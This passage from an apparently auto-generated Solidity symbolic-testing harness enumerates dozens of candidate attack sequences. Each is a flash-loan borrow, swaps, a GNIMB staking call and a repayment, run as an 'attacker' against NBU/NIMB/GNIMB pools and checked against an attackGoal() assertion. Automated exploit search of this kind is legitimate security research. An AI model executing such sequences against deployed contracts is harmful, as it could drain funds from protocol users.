        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
